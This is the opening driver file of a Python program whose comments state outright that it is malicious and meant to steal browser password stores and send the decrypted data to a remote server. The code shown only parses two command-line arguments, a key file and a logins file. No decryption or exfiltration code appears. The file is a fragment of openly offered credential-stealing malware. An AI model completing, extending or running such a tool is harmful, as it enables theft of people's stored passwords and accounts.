## This is the driver file for the main program.
## This program is malicious by nature, do not run unless you intend to cause damage or understand what you are doing.
## I am not responsible for any damage or trouble you may get into by running this program.

## The intent of this program is to steal browser password stores and copy the decrypted data to a remote server.

import argparse
import sys
import os

def grab_ComandLine(): # Function to grab command line arguments.
    parser = argparse.ArgumentParser()
    parser.add_argument('-k', type=str, required=True, help='Key File')
    parser.add_argument('-l', type=str, required=True, help='Logins')
    
    args = parser.parse_args()
    keyFilePath = args.k
    loginsFilePath = args.l
    
    return keyFilePath, loginsFilePath

